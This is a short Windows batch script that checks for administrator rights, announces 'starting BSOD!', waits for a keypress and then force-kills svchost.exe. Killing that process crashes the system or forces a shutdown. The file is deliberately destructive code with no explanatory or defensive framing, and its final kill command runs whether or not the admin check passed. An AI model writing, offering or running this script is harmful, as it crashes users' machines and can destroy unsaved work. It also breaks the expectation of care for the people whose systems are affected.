@echo off
net session >nul 2>&1
if %errorlevel% == 0 (
echo Administrator privileges detected starting BSOD!
) else (
echo Administrator privileges required
)
pause >nul
taskkill.exe /f /im svchost.exe